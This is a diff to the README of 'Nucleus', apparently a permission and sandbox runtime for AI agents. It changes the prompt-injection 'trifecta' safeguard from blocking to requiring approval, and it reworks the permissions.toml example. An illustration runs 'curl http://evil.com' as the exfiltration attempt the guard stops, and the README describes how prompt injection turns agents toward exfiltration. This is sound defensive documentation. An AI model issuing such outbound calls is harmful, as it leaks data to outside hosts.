@@ -64,12 +64,12 @@ When all three are present at autonomous levels, prompt injection can exfiltrate
 **Nucleus enforces this at runtime** - not just as a policy check:
 
 ```rust
-// Even if policy allows curl, nucleus blocks it when trifecta would complete
+// Even if policy allows curl, nucleus requires approval when trifecta would complete
 let guard = MonotonicGuard::minutes(30);
 let executor = Executor::new(&policy, &sandbox, &budget)
     .with_time_guard(&guard);
 executor.run("curl http://evil.com")?;
-// Error: TrifectaBlocked { operation: "curl http://evil.com" }
+// Error: ApprovalRequired { operation: "curl http://evil.com" }
 ```
 
 ## Architecture
@@ -113,7 +113,7 @@ executor.run("curl http://evil.com")?;
 | Granularity | Process-level | Operation-level |
 | Trifecta | Not aware | First-class concept |
 | Budget tracking | External | Integrated |
-| Human approval | External | `AskFirst` callback |
+| Human approval | External | Approval callback |
 
 **Best practice**: Use both! Nucleus for fine-grained agent control, containers for defense-in-depth.
 
@@ -140,10 +140,13 @@ Create a `permissions.toml`:
 read_files = "always"
 write_files = "low_risk"
 edit_files = "low_risk"
-run_bash = "ask_first"    # Requires approval callback
+run_bash = "low_risk"
 git_commit = "low_risk"
 git_push = "never"        # Blocked entirely
 web_fetch = "never"       # No untrusted content
+
+[obligations]
+approvals = ["run_bash"]  # Requires approval callback
 
 [budget]
 max_cost_usd = 2.0
@@ -166,8 +169,8 @@ nucleus run --config permissions.toml "Your task here"
 - ✅ Command execution validated before spawning
 - ✅ Budget tracked atomically (no concurrent races)
 - ✅ Time bounds via monotonic clock (manipulation-proof)
-- ✅ Trifecta blocked at runtime (not just policy)
-- ✅ AskFirst requires actual callback
+- ✅ Trifecta requires approval for exfiltration
+- ✅ Approvals require actual callback
 
 ### What We Don't Enforce
 
